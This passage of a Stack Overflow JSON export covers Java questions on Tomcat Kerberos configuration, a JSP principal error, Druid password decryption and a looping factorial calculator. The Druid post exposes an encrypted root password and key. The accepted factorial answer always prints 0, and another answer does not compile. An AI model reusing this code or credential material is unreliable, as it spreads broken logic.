using tomcat. I added a krb5.conf file under the tomcat directory and in SpnegoFilterConfig the value is read and java.security.krb5.conf is set , however it seems not to be taken in consideration. No matter if the file is there or not i get the same result.\r\n\r\n    javax.servlet.ServletException: GSSException: Failure unspecified at GSS-API level (Mechanism level: Encryption type AES256 CTS mode with HMAC SHA1-96 is not supported/enabled)\r\n\r\nIf i put the jce security files in lib/security i get\r\n \r\n\r\n    javax.servlet.ServletException: GSSException: Failure unspecified at GSS-API level (Mechanism level: Invalid argument (400) - Cannot find key of appropriate type to decrypt AP REP - AES256 CTS mode with HMAC SHA1-96)\r\n\r\nHowever this is happening no matter if i have the krb5.conf or not.","title":"krb5.conf file ignored by tomcat","body":"<p>I am trying to setup kerberos/spnego authentication using tomcat. I added a krb5.conf file under the tomcat directory and in SpnegoFilterConfig the value is read and java.security.krb5.conf is set , however it seems not to be taken in consideration. No matter if the file is there or not i get the same result.</p>\n\n<pre><code>javax.servlet.ServletException: GSSException: Failure unspecified at GSS-API level (Mechanism level: Encryption type AES256 CTS mode with HMAC SHA1-96 is not supported/enabled)\n</code></pre>\n\n<p>If i put the jce security files in lib/security i get</p>\n\n<pre><code>javax.servlet.ServletException: GSSException: Failure unspecified at GSS-API level (Mechanism level: Invalid argument (400) - Cannot find key of appropriate type to decrypt AP REP - AES256 CTS mode with HMAC SHA1-96)\n</code></pre>\n\n<p>However this is happening no matter if i have the krb5.conf or not.</p>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":17002054,"reputation":105,"user_id":12299208,"display_name":"Sayan Dasgupta"},"score":0,"creation_date":1638988777,"post_id":70279247,"comment_id":124236138,"body_markdown":"What is the error ?","body":"What is the error ?"},{"owner":{"account_id":23590337,"reputation":1,"user_id":17628216,"display_name":"Bruno Calderon Montero"},"score":0,"creation_date":1639005923,"post_id":70279247,"comment_id":124241313,"body_markdown":"The method getPrincipal() is undefined for the type Principal\tindex.jsp","body":"The method getPrincipal() is undefined for the type Principal\tindex.jsp"},{"owner":{"account_id":17002054,"reputation":105,"user_id":12299208,"display_name":"Sayan Dasgupta"},"score":0,"creation_date":1639076704,"post_id":70279247,"comment_id":124262884,"body_markdown":"that probably means that the getter is not properly created in the entity file of the Principal","body":"that probably means that the getter is not properly created in the entity file of the Principal"}],"owner":{"account_id":23590337,"reputation":1,"user_id":17628216,"display_name":"Bruno Calderon Montero"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":35,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1639573729,"creation_date":1638984401,"question_id":70279247,"body_markdown":"Trying to figure the cause for this error, any solution?\r\necplise java sts\r\n\r\n*&quot;The method getPrincipal() is undefined for the type Principal&quot;*\r\n        \r\n    \r\n        &lt;layout:put block=&quot;x-brand-options&quot;&gt;\r\n    &lt;c:set var=&quot;name&quot; value=&quot;${pageContext.request.userPrincipal.principal.name}&quot;/&gt;\r\n    &lt;div class=&quot;right menu&quot;&gt;\r\n      &lt;div class=&quot;ui dropdown item&quot; id=&quot;cbo-profile&quot;&gt;\r\n        &lt;i class=&quot;user icon&quot;&gt;&lt;/i&gt;\r\n        ${name} &lt;i class=&quot;dropdown icon&quot;&gt;&lt;/i&gt;\r\n        &lt;div class=&quot;menu&quot;&gt;\r\n          &lt;a class=&quot;item&quot;&gt;Perfil&lt;/a&gt;\r\n          &lt;div class=&quot;divider&quot; style=&quot;margin:0px;&quot;&gt;&lt;/div&gt;\r\n          &lt;form action=&quot;/logout&quot;\r\n            method=&quot;post&quot;\r\n            name=&quot;logoutform&quot;&gt;\r\n            &lt;input type=&quot;hidden&quot;\r\n              name=&quot;${_csrf.parameterName}&quot;\r\n              value=&quot;${_csrf.token}&quot;/&gt;\r\n          &lt;/form&gt;\r\n          &lt;a class=&quot;item&quot; onclick=&quot;document.logoutform.submit();&quot;&gt;\r\n            &lt;i class=&quot;sign out icon&quot;&gt;&lt;/i&gt;\r\n            Cerrar Sesi&#243;n\r\n          &lt;/a&gt;\r\n        &lt;/div&gt;\r\n      &lt;/div&gt;\r\n    &lt;/div&gt;\r\n    &lt;/layout:put&gt; ","title":"why a have this error in Java eclipse STS?","body":"<p>Trying to figure the cause for this error, any solution?\necplise java sts</p>\n<p><em>&quot;The method getPrincipal() is undefined for the type Principal&quot;</em></p>\n<pre><code>    &lt;layout:put block=&quot;x-brand-options&quot;&gt;\n&lt;c:set var=&quot;name&quot; value=&quot;${pageContext.request.userPrincipal.principal.name}&quot;/&gt;\n&lt;div class=&quot;right menu&quot;&gt;\n  &lt;div class=&quot;ui dropdown item&quot; id=&quot;cbo-profile&quot;&gt;\n    &lt;i class=&quot;user icon&quot;&gt;&lt;/i&gt;\n    ${name} &lt;i class=&quot;dropdown icon&quot;&gt;&lt;/i&gt;\n    &lt;div class=&quot;menu&quot;&gt;\n      &lt;a class=&quot;item&quot;&gt;Perfil&lt;/a&gt;\n      &lt;div class=&quot;divider&quot; style=&quot;margin:0px;&quot;&gt;&lt;/div&gt;\n      &lt;form action=&quot;/logout&quot;\n        method=&quot;post&quot;\n        name=&quot;logoutform&quot;&gt;\n        &lt;input type=&quot;hidden&quot;\n          name=&quot;${_csrf.parameterName}&quot;\n          value=&quot;${_csrf.token}&quot;/&gt;\n      &lt;/form&gt;\n      &lt;a class=&quot;item&quot; onclick=&quot;document.logoutform.submit();&quot;&gt;\n        &lt;i class=&quot;sign out icon&quot;&gt;&lt;/i&gt;\n        Cerrar Sesión\n      &lt;/a&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/div&gt;\n&lt;/layout:put&gt; \n</code></pre>\n"},{"tags":["java","druid","ssm"],"answers":[{"tags":[],"owner":{"account_id":14927870,"reputation":61,"user_id":10778125,"display_name":"Vadim Ogievetsky"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1571877545,"creation_date":1571877545,"answer_id":58532633,"question_id":58514308,"body_markdown":"What as the issue? Note that you can see what Druid interprets as your properties by doing `GET /status/properties`","title":"Why the druid cannot decode the password","body":"<p>What as the issue? Note that you can see what Druid interprets as your properties by doing <code>GET /status/properties</code></p>\n"}],"owner":{"account_id":15932810,"reputation":3,"user_id":11496689,"display_name":"CRUDTest"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":261,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":58532633,"answer_count":1,"score":0,"last_activity_date":1639573702,"creation_date":1571794889,"question_id":58514308,"body_markdown":"\r\nif change the ${druid.password} to my database password everything is well done\r\n\r\n  [1]: https://i.stack.imgur.com/DcdWA.png\r\n  [2]: https://i.stack.imgur.com/iwl9n.png\r\n  [3]: https://i.stack.imgur.com/jDJyj.png\r\n\r\nif druid not decode the password?\r\n\r\nmy db.properties\r\n\r\n    druid.Driver=com.mysql.cj.jdbc.Driver\r\n    druid.url=jdbc:mysql://localhost:3306/dongnanceshi?useSSL=false&amp;useUncode=true&amp;characterEncoding=utf-8&amp;serverTimezone=Asia/Shanghai\r\n    druid.user=root\r\n    druid.password=fF4CHVVYbY4Q9iHXqaylbdMP9TrlroIq0Bh3cKldca9CX5J7QhKIoXTZ4Ar0JNkVx+GIqYhGvS4gHjA43yq2YQ==\r\n    druid.publickey=MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAI2z3FiKNWaIlynCGoe+SFOjG2Xd10QP6MNFCF3VcXG8PCLd/xRkkMx9ojfPMdXn8YhcbK79OcpPCkMnlhr2ux0CAwEAAQ==\r\n\r\nspring-dao.xml\r\n\r\n    &lt;bean id=&quot;dataSource&quot; class=&quot;com.alibaba.druid.pool.DruidDataSource&quot;&gt;\r\n        &lt;property name=&quot;driverClassName&quot; value=&quot;${druid.Driver}&quot;/&gt;\r\n        &lt;property name=&quot;url&quot; value=&quot;${druid.url}&quot; /&gt;\r\n        &lt;property name=&quot;username&quot; value=&quot;${druid.user}&quot;/&gt;\r\n        &lt;property name=&quot;password&quot; value=&quot;${druid.password}&quot;/&gt;\r\n        &lt;property name=&quot;filters&quot; value=&quot;stat&quot; /&gt;\r\n        &lt;property name=&quot;connectionProperties&quot; value=&quot;config.decrypt=true;config.decrypt.key=${druid.publickey}&quot;/&gt;\r\n    &lt;/bean&gt;\r\n\r\n\r\nJunit Test\r\n\r\n    @RunWith(SpringJUnit4ClassRunner.class)\r\n    @ContextConfiguration(locations = {&quot;classpath:spring/spring-dao.xml&quot;,&quot;classpath:spring/spring-service.xml&quot;})\r\n    public class TestID {\r\n        @Autowired\r\n        TEnvBusSiteAirHourdatainfectMapper tEnvBusSiteAirHourdatainfectMapper;\r\n    \r\n        @Test\r\n        public void test3() {\r\n            List&lt;TEnvBusSiteAirHourdatainfect&gt; tEnvBusSiteAirHourdatainfects = tEnvBusSiteAirHourdatainfectMapper.queryAll(&quot;a34002&quot;);\r\n        }\r\n    }\r\n\r\nAND the error log\r\n\r\n    [Druid-ConnectionPool-Create-1912172027] ERROR com.alibaba.druid.pool.DruidDataSource - create connection SQLException, url: jdbc:mysql://localhost:3306/dongnanceshi?useSSL=false&amp;useUncode=true&amp;characterEncoding=utf-8&amp;serverTimezone=Asia/Shanghai, errorCode 1045, state 28000 java.sql.SQLException: Access denied for user &#39;root&#39;@&#39;localhost&#39; (using password: YES)\r\n\r\n\r\n\r\n\r\n\r\n","title":"Why the druid cannot decode the password","body":"<p>if change the ${druid.password} to my database password everything is well done</p>\n\n<p>if druid not decode the password?</p>\n\n<p>my db.properties</p>\n\n<pre><code>druid.Driver=com.mysql.cj.jdbc.Driver\ndruid.url=jdbc:mysql://localhost:3306/dongnanceshi?useSSL=false&amp;useUncode=true&amp;characterEncoding=utf-8&amp;serverTimezone=Asia/Shanghai\ndruid.user=root\ndruid.password=fF4CHVVYbY4Q9iHXqaylbdMP9TrlroIq0Bh3cKldca9CX5J7QhKIoXTZ4Ar0JNkVx+GIqYhGvS4gHjA43yq2YQ==\ndruid.publickey=MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAI2z3FiKNWaIlynCGoe+SFOjG2Xd10QP6MNFCF3VcXG8PCLd/xRkkMx9ojfPMdXn8YhcbK79OcpPCkMnlhr2ux0CAwEAAQ==\n</code></pre>\n\n<p>spring-dao.xml</p>\n\n<pre><code>&lt;bean id=\"dataSource\" class=\"com.alibaba.druid.pool.DruidDataSource\"&gt;\n    &lt;property name=\"driverClassName\" value=\"${druid.Driver}\"/&gt;\n    &lt;property name=\"url\" value=\"${druid.url}\" /&gt;\n    &lt;property name=\"username\" value=\"${druid.user}\"/&gt;\n    &lt;property name=\"password\" value=\"${druid.password}\"/&gt;\n    &lt;property name=\"filters\" value=\"stat\" /&gt;\n    &lt;property name=\"connectionProperties\" value=\"config.decrypt=true;config.decrypt.key=${druid.publickey}\"/&gt;\n&lt;/bean&gt;\n</code></pre>\n\n<p>Junit Test</p>\n\n<pre><code>@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(locations = {\"classpath:spring/spring-dao.xml\",\"classpath:spring/spring-service.xml\"})\npublic class TestID {\n    @Autowired\n    TEnvBusSiteAirHourdatainfectMapper tEnvBusSiteAirHourdatainfectMapper;\n\n    @Test\n    public void test3() {\n        List&lt;TEnvBusSiteAirHourdatainfect&gt; tEnvBusSiteAirHourdatainfects = tEnvBusSiteAirHourdatainfectMapper.queryAll(\"a34002\");\n    }\n}\n</code></pre>\n\n<p>AND the error log</p>\n\n<pre><code>[Druid-ConnectionPool-Create-1912172027] ERROR com.alibaba.druid.pool.DruidDataSource - create connection SQLException, url: jdbc:mysql://localhost:3306/dongnanceshi?useSSL=false&amp;useUncode=true&amp;characterEncoding=utf-8&amp;serverTimezone=Asia/Shanghai, errorCode 1045, state 28000 java.sql.SQLException: Access denied for user 'root'@'localhost' (using password: YES)\n</code></pre>\n"},{"tags":["java","loops","factorial"],"comments":[{"owner":{"account_id":45213,"reputation":26348,"user_id":133203,"accept_rate":97,"display_name":"Federico klez Culloca"},"score":1,"creation_date":1639406395,"post_id":70336308,"comment_id":124333663,"body_markdown":"Does this answer your question? [How would I use a while loop to keep requesting user input](https://stackoverflow.com/questions/33036087/how-would-i-use-a-while-loop-to-keep-requesting-user-input)","body":"Does this answer your question? <a href=\"https://stackoverflow.com/questions/33036087/how-would-i-use-a-while-loop-to-keep-requesting-user-input\">How would I use a while loop to keep requesting user input</a>"}],"answers":[{"tags":[],"owner":{"account_id":17813347,"reputation":1635,"user_id":12937443,"display_name":"DEV"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639406986,"creation_date":1639406344,"answer_id":70336371,"question_id":70336308,"body_markdown":"use while loop when user not typing a positif number : \r\n\r\n    System.out.print(&quot;Enter a positive integer: &quot;);\r\n    num = input.nextInt();\r\n    while(num&lt;0) {\r\n        System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\r\n        num = input.nextInt();\r\n    }\r\n    \r\n**code :** \r\n\r\n        import java.util.Scanner;\r\n    \r\n    public class Main {\r\n    \r\n        public static void main(String[] args) {\r\n            Scanner input = new Scanner(System.in);\r\n    \r\n            int num, num2 = 1, x, i;\r\n    \r\n            System.out.println(&quot;-------------Factorial Calculator-------------&quot;);\r\n            System.out.print(&quot;Enter a positive integer: &quot;);\r\n            num = input.nextInt();\r\n            input.nextLine();\r\n            while (num &lt; 0) {\r\n                System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\r\n                System.out.print(&quot;Enter a positive integer: &quot;);\r\n                num = input.nextInt();\r\n            }\r\n            if (num &gt; 0) {\r\n                System.out.print(num + &quot;! = &quot;);\r\n                for (i = 1; i &lt;= num; i++) {\r\n                    if (i &lt; num) {\r\n                        System.out.print(i + &quot; x &quot;);\r\n                        num2 = num2 * i;\r\n                    }\r\n                    if (i == num) {\r\n                        System.out.print(i);\r\n                        num2 = num2 * i;\r\n                        System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\r\n                        System.out.println();\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }","title":"Factorial Calculator","body":"<p>use while loop when user not typing a positif number :</p>\n<pre><code>System.out.print(&quot;Enter a positive integer: &quot;);\nnum = input.nextInt();\nwhile(num&lt;0) {\n    System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\n    num = input.nextInt();\n}\n</code></pre>\n<p><strong>code :</strong></p>\n<pre><code>    import java.util.Scanner;\n\npublic class Main {\n\n    public static void main(String[] args) {\n        Scanner input = new Scanner(System.in);\n\n        int num, num2 = 1, x, i;\n\n        System.out.println(&quot;-------------Factorial Calculator-------------&quot;);\n        System.out.print(&quot;Enter a positive integer: &quot;);\n        num = input.nextInt();\n        input.nextLine();\n        while (num &lt; 0) {\n            System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\n            System.out.print(&quot;Enter a positive integer: &quot;);\n            num = input.nextInt();\n        }\n        if (num &gt; 0) {\n            System.out.print(num + &quot;! = &quot;);\n            for (i = 1; i &lt;= num; i++) {\n                if (i &lt; num) {\n                    System.out.print(i + &quot; x &quot;);\n                    num2 = num2 * i;\n                }\n                if (i == num) {\n                    System.out.print(i);\n                    num2 = num2 * i;\n                    System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\n                    System.out.println();\n                }\n            }\n        }\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":12822707,"reputation":677,"user_id":9276996,"display_name":"Turtle"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639406900,"creation_date":1639406364,"answer_id":70336378,"question_id":70336308,"body_markdown":"Use a `while` loop\r\n\r\n    import java.util.Scanner;\r\n\r\n    public class Loops {\r\n        static boolean readInput = true;\r\n        public static void main(String[] args) {\r\n            while(readInput) calculateFactorial();\r\n        }\r\n    }\r\n\r\n    private static void calculateFactorial() {\r\n        Scanner input = new Scanner(System.in);\r\n    \r\n        int num, num2 = 1, x, i;\r\n    \r\n        System.out.println(&quot;-------------Factorial Calculator-------------&quot;);\r\n        System.out.print(&quot;Enter a positive integer: &quot;);\r\n        num = input.nextInt();\r\n        if(num &lt;= 0) {\r\n            readInput = false;\r\n            return;\r\n        }\r\n    \r\n        if (num &gt; 0) {\r\n            System.out.print(num + &quot;! = &quot;);\r\n            for (i = 1; i &lt;= num; i++) {\r\n                if(i &lt; num){\r\n                    System.out.print(i + &quot; x &quot;);\r\n                    num2 = num2 * i;\r\n                }\r\n                if(i == num){\r\n                    System.out.print(i);\r\n                    num2 = num2 * i;\r\n                    System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\r\n                    System.out.println();\r\n                }\r\n            }\r\n        }else if (num &lt; 0) {\r\n            System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\r\n        }\r\n    }","title":"Factorial Calculator","body":"<p>Use a <code>while</code> loop</p>\n<pre><code>import java.util.Scanner;\n\npublic class Loops {\n    static boolean readInput = true;\n    public static void main(String[] args) {\n        while(readInput) calculateFactorial();\n    }\n}\n\nprivate static void calculateFactorial() {\n    Scanner input = new Scanner(System.in);\n\n    int num, num2 = 1, x, i;\n\n    System.out.println(&quot;-------------Factorial Calculator-------------&quot;);\n    System.out.print(&quot;Enter a positive integer: &quot;);\n    num = input.nextInt();\n    if(num &lt;= 0) {\n        readInput = false;\n        return;\n    }\n\n    if (num &gt; 0) {\n        System.out.print(num + &quot;! = &quot;);\n        for (i = 1; i &lt;= num; i++) {\n            if(i &lt; num){\n                System.out.print(i + &quot; x &quot;);\n                num2 = num2 * i;\n            }\n            if(i == num){\n                System.out.print(i);\n                num2 = num2 * i;\n                System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\n                System.out.println();\n            }\n        }\n    }else if (num &lt; 0) {\n        System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":7778850,"reputation":184,"user_id":5885968,"display_name":"M. Gianota"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1639407772,"creation_date":1639406859,"answer_id":70336488,"question_id":70336308,"body_markdown":"Put the code that computes the factorial in a separate method and call it from within a loop in main().\r\n\r\n```\r\nimport java.util.Scanner;\r\n\r\npublic class Loops {\r\n\r\n    public static void printFactorial(int num) {\r\n        int i = 0;\r\n        int num2 = 0;\r\n        if (num &gt; 0) {\r\n            System.out.print(num + &quot;! = &quot;);\r\n            for (i = 1; i &lt;= num; i++) {\r\n                if(i &lt; num){\r\n                    System.out.print(i + &quot; x &quot;);\r\n                    num2 = num2 * i;\r\n                }\r\n                if(i == num){\r\n                    System.out.print(i);\r\n                    num2 = num2 * i;\r\n                    System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\r\n                    System.out.println();\r\n                }\r\n            }\r\n        }else if (num &lt; 0) {\r\n            System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\r\n            System.exit(0);\r\n        }\r\n\r\n    }\r\n    public static void main(String[] args)\r\n    {\r\n        Scanner input = new Scanner(System.in);\r\n        int num = 0;\r\n        System.out.println(&quot;-------------Factorial Calculator-------------&quot;);\r\n        while ( true ) {\r\n            System.out.print(&quot;Enter a positive integer: &quot;);\r\n            num = input.nextInt();\r\n            printFactorial(num);\r\n        }\r\n    }\r\n}\r\n```","title":"Factorial Calculator","body":"<p>Put the code that computes the factorial in a separate method and call it from within a loop in main().</p>\n<pre><code>import java.util.Scanner;\n\npublic class Loops {\n\n    public static void printFactorial(int num) {\n        int i = 0;\n        int num2 = 0;\n        if (num &gt; 0) {\n            System.out.print(num + &quot;! = &quot;);\n            for (i = 1; i &lt;= num; i++) {\n                if(i &lt; num){\n                    System.out.print(i + &quot; x &quot;);\n                    num2 = num2 * i;\n                }\n                if(i == num){\n                    System.out.print(i);\n                    num2 = num2 * i;\n                    System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\n                    System.out.println();\n                }\n            }\n        }else if (num &lt; 0) {\n            System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\n            System.exit(0);\n        }\n\n    }\n    public static void main(String[] args)\n    {\n        Scanner input = new Scanner(System.in);\n        int num = 0;\n        System.out.println(&quot;-------------Factorial Calculator-------------&quot;);\n        while ( true ) {\n            System.out.print(&quot;Enter a positive integer: &quot;);\n            num = input.nextInt();\n            printFactorial(num);\n        }\n    }\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":20150877,"reputation":73,"user_id":14778218,"display_name":"Raj"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639406962,"creation_date":1639406962,"answer_id":70336516,"question_id":70336308,"body_markdown":"\r\n\r\n\r\n\t\t\r\n    import java.util.Scanner;\r\n\r\n    public class Main {\r\n    public static void main(String[] args) \r\n    {\r\n        Scanner input = new Scanner(System.in);\r\n        \r\n        \r\n        boolean runMore = true;\r\n        \r\n        while(runMore){\r\n        \r\n        \r\n\r\n        int num, num2 = 1, x, i;\r\n\r\n        System.out.println(&quot;-------------Factorial Calculator-------------&quot;);\r\n        System.out.print(&quot;Enter a positive integer: &quot;);\r\n        num = input.nextInt();\r\n\r\n        if (num &gt; 0) {\r\n            System.out.print(num + &quot;! = &quot;);\r\n            for (i = 1; i &lt;= num; i++) {\r\n                if(i &lt; num){\r\n                    System.out.print(i + &quot; x &quot;);\r\n                    num2 = num2 * i;\r\n                }\r\n                if(i == num){\r\n                    System.out.print(i);\r\n                    num2 = num2 * i;\r\n                    System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\r\n                    System.out.println();\r\n                }\r\n            }\r\n        }else if (num &lt; 0) {\r\n            System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\r\n        }\r\n        \r\n        System.out.println(&quot;Want to contine : Enter &#39;1&#39; for yes and &#39;0&#39; for no&quot;);\r\n        int wantToContinue = input.nextInt();\r\n        \r\n        if(wantToContinue==0){\r\n            \r\n            runMore = false;\r\n        }\r\n        \r\n        }\r\n    }\r\n    }\r\n\t\t\r\n\t\t\r\n\t\r\n\r\n","title":"Factorial Calculator","body":"<pre><code>import java.util.Scanner;\n\npublic class Main {\npublic static void main(String[] args) \n{\n    Scanner input = new Scanner(System.in);\n    \n    \n    boolean runMore = true;\n    \n    while(runMore){\n    \n    \n\n    int num, num2 = 1, x, i;\n\n    System.out.println(&quot;-------------Factorial Calculator-------------&quot;);\n    System.out.print(&quot;Enter a positive integer: &quot;);\n    num = input.nextInt();\n\n    if (num &gt; 0) {\n        System.out.print(num + &quot;! = &quot;);\n        for (i = 1; i &lt;= num; i++) {\n            if(i &lt; num){\n                System.out.print(i + &quot; x &quot;);\n                num2 = num2 * i;\n            }\n            if(i == num){\n                System.out.print(i);\n                num2 = num2 * i;\n                System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\n                System.out.println();\n            }\n        }\n    }else if (num &lt; 0) {\n        System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\n    }\n    \n    System.out.println(&quot;Want to contine : Enter '1' for yes and '0' for no&quot;);\n    int wantToContinue = input.nextInt();\n    \n    if(wantToContinue==0){\n        \n        runMore = false;\n    }\n    \n    }\n}\n}\n    \n    \n</code></pre>\n"},{"tags":[],"owner":{"account_id":23654300,"reputation":1,"user_id":17682816,"display_name":"Emmanuel Jamili"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639573593,"creation_date":1639566561,"answer_id":70362650,"question_id":70336308,"body_markdown":"    import java.util.Scanner;\r\n    \r\n    public class FactorialCalculator1 {\r\n    \r\n    public static void main(String[] args) {\r\n        \r\n            Scanner input = new Scanner(System.in);\r\n            \r\n            int num;\r\n            \r\n            System.out.println(&quot;&lt;------Factorial Calculator------&gt;&quot;);\r\n            while ( true ) {\r\n                \r\n            System.out.print(&quot;Enter a positive integer: &quot;);\r\n            num = input.nextInt();\r\n            \r\n            boolean runMore = true;\r\n            \r\n            int i;\r\n            int num2 = 1;\r\n            \r\n            if (num &gt; 0) {\r\n                System.out.print(num + &quot;! = &quot;);\r\n                for (i = 1; i &lt;= num; i++) {\r\n                    if(i &lt; num){\r\n                        System.out.print(i + &quot; x &quot;);\r\n                        num2 = num2 * i;\r\n                    }\r\n                    if(i == num){\r\n                        System.out.print(i);\r\n                        num2 = num2 * i;\r\n                        System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is: &quot; + num2);\r\n                        System.out.println();\r\n                    }\r\n                }\r\n            }else if (num &lt; 0) {\r\n                System.out.println(&quot;Invalid input! Program stopped!&quot;);\r\n                System.exit(0);\r\n               }\r\n            }\r\n        }\r\n    }\r\n\r\n","title":"Factorial Calculator","body":"<pre><code>import java.util.Scanner;\n\npublic class FactorialCalculator1 {\n\npublic static void main(String[] args) {\n    \n        Scanner input = new Scanner(System.in);\n        \n        int num;\n        \n        System.out.println(&quot;&lt;------Factorial Calculator------&gt;&quot;);\n        while ( true ) {\n            \n        System.out.print(&quot;Enter a positive integer: &quot;);\n        num = input.nextInt();\n        \n        boolean runMore = true;\n        \n        int i;\n        int num2 = 1;\n        \n        if (num &gt; 0) {\n            System.out.print(num + &quot;! = &quot;);\n            for (i = 1; i &lt;= num; i++) {\n                if(i &lt; num){\n                    System.out.print(i + &quot; x &quot;);\n                    num2 = num2 * i;\n                }\n                if(i == num){\n                    System.out.print(i);\n                    num2 = num2 * i;\n                    System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is: &quot; + num2);\n                    System.out.println();\n                }\n            }\n        }else if (num &lt; 0) {\n            System.out.println(&quot;Invalid input! Program stopped!&quot;);\n            System.exit(0);\n           }\n        }\n    }\n}\n</code></pre>\n"}],"owner":{"account_id":23542411,"reputation":33,"user_id":17586407,"display_name":"Francis Putnam"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":874,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"accepted_answer_id":70336488,"answer_count":5,"score":0,"last_activity_date":1639573593,"creation_date":1639406073,"question_id":70336308,"body_markdown":"How can I make the program to perform a new or repeat the operation or ask the user to input again a number and know the factorial of it.\r\n\r\n    import java.util.Scanner;\r\n    \r\n    public class Loops {\r\n    \r\n    \tpublic static void main(String[] args) \r\n    \t{\r\n    \t\tScanner input = new Scanner(System.in);\r\n    \r\n    \t\tint num, num2 = 1, x, i;\r\n    \r\n    \t\tSystem.out.println(&quot;-------------Factorial Calculator-------------&quot;);\r\n    \t\tSystem.out.print(&quot;Enter a positive integer: &quot;);\r\n    \t\tnum = input.nextInt();\r\n    \r\n    \t\tif (num &gt; 0) {\r\n    \t\t\tSystem.out.print(num + &quot;! = &quot;);\r\n    \t\t\tfor (i = 1; i &lt;= num; i++) {\r\n    \t\t\t\tif(i &lt; num){\r\n    \t\t\t\t\tSystem.out.print(i + &quot; x &quot;);\r\n    \t\t\t\t\tnum2 = num2 * i;\r\n    \t\t\t\t}\r\n    \t\t\t\tif(i == num){\r\n    \t\t\t\t\tSystem.out.print(i);\r\n    \t\t\t\t\tnum2 = num2 * i;\r\n    \t\t\t\t\tSystem.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\r\n    \t\t\t\t\tSystem.out.println();\r\n    \t\t\t\t}\r\n    \t\t\t}\r\n    \t\t}else if (num &lt; 0) {\r\n    \t\t\tSystem.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\r\n    \t\t}\r\n    \t}\r\n    }\r\n\r\n\r\n","title":"Factorial Calculator","body":"<p>How can I make the program to perform a new or repeat the operation or ask the user to input again a number and know the factorial of it.</p>\n<pre><code>import java.util.Scanner;\n\npublic class Loops {\n\n    public static void main(String[] args) \n    {\n        Scanner input = new Scanner(System.in);\n\n        int num, num2 = 1, x, i;\n\n        System.out.println(&quot;-------------Factorial Calculator-------------&quot;);\n        System.out.print(&quot;Enter a positive integer: &quot;);\n        num = input.nextInt();\n\n        if (num &gt; 0) {\n            System.out.print(num + &quot;! = &quot;);\n            for (i = 1; i &lt;= num; i++) {\n                if(i &lt; num){\n                    System.out.print(i + &quot; x &quot;);\n                    num2 = num2 * i;\n                }\n                if(i == num){\n                    System.out.print(i);\n                    num2 = num2 * i;\n                    System.out.println(&quot;\\nThe factorial of &quot; + num + &quot; is &quot; + num2);\n                    System.out.println();\n                }\n            }\n        }else if (num &lt; 0) {\n            System.out.println(&quot;Please input a valid integer. Program stopped.&quot;);\n        }\n    }\n}\n</code></pre>\n"},{"tags":["java","spring-boot","plugin-architecture"],"comments":[{"owner":{"account_id":114128,"reputation":50422,"user_id":300257,"accept_rate":89,"display_name":"Gilbert Le Blanc"},"score":0,"creation_date":1639575499,"post_id":70364095,"comment_id":124383292,"body_markdown":"OSGi is complicated because of the requirements that need to be satisfied.  You can try and craft your own solution, or you can go with a defined solution.","body":"OSGi is complicated because of the requirements that need to be satisfied.  You can try and craft your own solution, or you can go with a defined solution."}],"owner":{"account_id":4012536,"reputation":720,"user_id":3305534,"accept_rate":42,"display_name":"Sriram Sridharan"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":660,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1639573038,"creation_date":1639573038,"question_id":70364095,"body_markdown":"I am writing a Spring Boot API application, which has to have a plugin architecture. Following is a typical journey:\r\n\r\n 1. My App can execute a task (taking some input and returning an output)\r\n 2. I have an interface called `TaskExecutor` with a few methods (for example: `execute(Object... inputArgs)`)\r\n 3. Users of my app write a plugin to handle a specific task (User simply implements the `TaskExecutor.execute(Object... args)` method to 